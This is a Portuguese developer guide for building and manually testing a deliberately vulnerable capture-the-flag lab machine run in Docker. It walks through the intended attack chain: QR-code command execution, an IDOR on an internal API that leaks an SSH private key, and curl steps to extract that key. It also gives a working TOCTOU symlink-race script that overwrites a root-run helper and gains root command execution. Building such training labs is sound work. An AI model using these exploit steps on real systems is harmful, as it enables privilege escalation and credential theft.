# Guia de Execução e Teste Manual — Sistema de Recarga do RU

**Atualizado em:** 10/11/2026. Comandos para o laboratório local, executados na raiz do repositório salvo indicação contrária. Os passos da etapa 1 e da obtenção da flag root ainda precisam de playtest integrado.

## Pré-requisitos

- Docker com Compose; cliente OpenSSH; Python 3.
- Ferramentas de QR Code para a etapa 1, conforme os testes existentes.
- Par de chaves de laboratório em `services/admin-api/dados/chave_operador_caixa.pem` e `chave_operador_caixa.pub` (a chave privada é entregue pela API vulnerável).

## Subir, inspecionar e encerrar

```bash
sudo docker compose -f deploy/docker-compose.yml up --build -d
sudo docker ps --filter name=ru-machine
sudo docker logs --tail 80 ru-machine
```

Portas publicadas no ambiente de desenvolvimento: portal `0.0.0.0:8000`, SSH `127.0.0.1:2222`. Painel `8081` e API `9090` são internos e **não** devem ser publicados para contornar a etapa de enumeração.

Se surgir `exec /entrypoint.sh: exec format error`, conferir se `#!/bin/bash` é o **primeiro byte** do arquivo (sem linha vazia/BOM) e se as quebras são Unix:

```bash
head -c 32 deploy/entrypoint.sh | xxd
bash -n deploy/entrypoint.sh
```

Para derrubar:

```bash
sudo docker compose -f deploy/docker-compose.yml down
```

## Etapa 1 — Acesso inicial via QR Code

1. Acessar `http://127.0.0.1:8000`.
2. Enumerar `/beta` e o recurso de carteirinha de teste `/carterinha-teste.jpg` conforme a kill chain.
3. Verificar o comportamento do QR Code e a execução de comandos pelo script legado.
4. No teste autorizado, confirmar obtenção de shell como `ru_web` e leitura de `/home/ru_web/user.txt`.

Os testes históricos `tests/test_decode_qr.py` e `tests/test_app_client.py` cobrem camadas isoladas. **A shell real via QR Code ainda não foi revalidada nesta rodada.**

## Etapa 2 — Enumeração interna

Depois de obter uma shell como `ru_web` **dentro do container**:

```bash
whoami
ps aux
# Se a ferramenta estiver instalada:
ss -tulpn
```

Serviços esperados: painel em `127.0.0.1:8081` e API em `127.0.0.1:9090`. Um `curl` do Kali para `127.0.0.1:9090` falhará porque esse endereço é o loopback do Kali, não do container. Não é necessário port forwarding para fazer consultas a partir de `ru_web`.

Para inspeção administrativa durante o desenvolvimento (não é o fluxo do jogador):

```bash
sudo docker exec ru-machine python3 -c '
import urllib.request
print(urllib.request.urlopen("http://127.0.0.1:9090/api/v1/operadores").read().decode())
'
```

## Etapa 3 — IDOR e acesso SSH

**Estes comandos HTTP devem ser executados na shell interna `ru_web`**, não no terminal Kali:

```bash
curl -s http://127.0.0.1:9090/api/v1/operadores
curl -s http://127.0.0.1:9090/api/v1/operadores/1
curl -s http://127.0.0.1:9090/api/v1/operadores/2
curl -s http://127.0.0.1:9090/api/v1/operadores/3
```

O registro 3 inclui `chave_privada`. Para extrair sem alterar as quebras de linha:

```bash
curl -s http://127.0.0.1:9090/api/v1/operadores/3 \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["chave_privada"],end="")' \
  > /tmp/operador_caixa.pem
chmod 600 /tmp/operador_caixa.pem
```

Para acessar o SSH a partir do **Kali**, a chave extraída precisa estar disponível nele. Durante o desenvolvimento, a chave local pode ser usada apenas para verificar o serviço:

```bash
ssh -i services/admin-api/dados/chave_operador_caixa.pem \
  -o IdentitiesOnly=yes -p 2222 operador_caixa@127.0.0.1
```

O teste realizado autenticou como UID 1001 e permitiu `cat ~/user.txt`, exibindo a flag 2. **Ainda falta validar o transporte da chave efetivamente extraída da API até o Kali**, sem recorrer à cópia de desenvolvimento.

Port forwarding SSH é **opcional e posterior** à obtenção da chave, para inspeção do serviço interno:

```bash
ssh -i services/admin-api/dados/chave_operador_caixa.pem \
  -p 2222 -L 9090:127.0.0.1:9090 operador_caixa@127.0.0.1
```

Enquanto a sessão estiver aberta, outro terminal do Kali poderá usar `curl http://127.0.0.1:9090/api/v1/operadores`. Esse túnel não faz parte do caminho necessário para descobrir a chave.

## Etapa 4 — Enumeração e TOCTOU

Na sessão SSH como `operador_caixa`:

```bash
whoami
ps aux
ls -la /var/ru/caixa
ls -la /opt
cat /opt/conciliacao.py
cat /opt/helper_conciliacao.sh  # esperado: Permission denied
ls -l /root/root.txt           # esperado: Permission denied
```

O job root lê `dados.csv`, faz `lstat()` em `conciliacao.tmp`, espera 15 segundos e depois escreve com `open(..., 'w')`. O operador controla os dados e o nome do arquivo temporário; a troca por symlink permite sobrescrever `/opt/helper_conciliacao.sh` antes de sua execução pelo job.

### Prova de conceito realizada via SSH

**Atenção: teste destrutivo para o helper; executar somente em instância descartável e recriar o container ao final.**

```bash
cat > /var/ru/caixa/dados.csv <<'EOF_PAYLOAD'
#!/bin/bash
id > /var/ru/prova_ssh.txt
EOF_PAYLOAD

cat > /tmp/testar_toctou.sh <<'EOF_RACE'
#!/bin/bash
DIR="/var/ru/caixa"
ALVO="/opt/helper_conciliacao.sh"
while true; do
    rm -f "$DIR/conciliacao.tmp"
    printf 'aguardando\n' > "$DIR/conciliacao.tmp"
    sleep 5
    rm -f "$DIR/conciliacao.tmp"
    ln -s "$ALVO" "$DIR/conciliacao.tmp"
    sleep 5
done
EOF_RACE
chmod +x /tmp/testar_toctou.sh
/tmp/testar_toctou.sh
```

Após aguardar alguns ciclos, interromper com `Ctrl+C` e verificar:

```bash
cat /var/ru/prova_ssh.txt
```

**Resultado observado:** `uid=0(root) gid=0(root) groups=0(root)`. A prova de conceito confirma execução de comandos como root, mas não demonstra, por si só, uma shell interativa ou a leitura de `/root/root.txt`.

### Restaurar depois da exploração

Sair da sessão SSH e, no Kali, recriar o container:

```bash
sudo docker compose -f deploy/docker-compose.yml up --build --force-recreate -d
sudo docker ps --filter name=ru-machine
```

A recriação descarta alterações no filesystem gravável do container (desde que não existam volumes persistentes adicionados posteriormente). Verificar que o helper original voltou antes de repetir testes.

## Pendências de QA

- Testar a cadeia completa a partir do QR Code até a recuperação da flag root.
- Auditar permissões da chave privada contra leitura direta por `ru_web`.
- Remover comentários explicativos da TOCTOU no código distribuído.
- Testar repetibilidade e ajustar exposição SSH para a plataforma dos jogadores.
